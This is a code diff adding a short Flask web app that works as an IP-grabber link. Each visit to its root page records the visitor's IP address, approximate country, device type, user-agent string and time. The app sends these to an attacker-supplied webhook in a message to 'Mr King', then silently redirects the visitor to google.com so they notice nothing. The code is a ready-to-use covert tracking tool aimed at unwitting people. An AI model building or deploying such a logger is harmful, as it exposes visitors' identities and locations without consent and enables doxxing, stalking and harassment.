@@ -1,0 +1,68 @@
+from flask import Flask, request, redirect
+from datetime import datetime
+import requests
+
+app = Flask(__name__)
+
+WEBHOOK_URL = "WEBHOOK_URL_HERE"
+
+def get_geo_info(ip):
+    try:
+        # Using a free IP geolocation API (ip-api)
+        response = requests.get(f"http://ip-api.com/json/{ip}")
+        data = response.json()
+        if data["status"] == "success":
+            return data.get("country", "Unknown")
+        else:
+            return "Unknown"
+    except Exception:
+        return "Unknown"
+
+def send_ip_info(ip, country, device, browser, date):
+    message = f"""Hello Mr King
+Someone has contacted you, here's their info:
+
+Ip: {ip}
+Where They live: {country}
+What device they use: {device}
+What is their browser data: {browser}
+Date/time: {date}
+"""
+    data = {
+        "content": message
+    }
+    requests.post(WEBHOOK_URL, json=data)
+
+@app.route("/")
+def index():
+    # Get client IP
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    
+    # Get date/time now
+    date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Get user-agent info
+    user_agent = request.headers.get("User-Agent", "Unknown")
+    
+    # Simple device info from user-agent (could be improved with a library)
+    if "Mobile" in user_agent or "Android" in user_agent or "iPhone" in user_agent:
+        device = "Mobile"
+    elif "Tablet" in user_agent or "iPad" in user_agent:
+        device = "Tablet"
+    else:
+        device = "Desktop"
+    
+    # Browser info (very basic extraction)
+    browser = user_agent
+    
+    # Get country info from IP
+    country = get_geo_info(ip)
+    
+    # Send webhook
+    send_ip_info(ip, country, device, browser, date)
+    
+    # Redirect user
+    return redirect("https://google.com")
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=5000)
